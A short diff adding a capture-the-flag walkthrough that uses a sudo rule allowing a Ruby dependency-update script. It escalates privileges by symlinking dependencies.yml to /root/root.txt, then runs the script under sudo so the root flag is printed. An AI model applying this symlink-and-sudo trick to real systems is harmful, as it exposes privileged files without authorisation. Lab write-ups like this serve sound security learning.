@@ -1,0 +1,12 @@
+You did sudo -l and got:
+/usr/bin/ruby /opt/update_dependencies.rb
+
+
+update_dependencies just uses a file dependencies.yml, loads it and updates it.
+so you just set a symbolic link to the flag:
+1. ln -s /root/root.txt dependencies.yml
+
+and then just call it:
+
+2. sudo /usr/bin/ruby /opt/update_dependencies.rb
+and you get the flag like a string
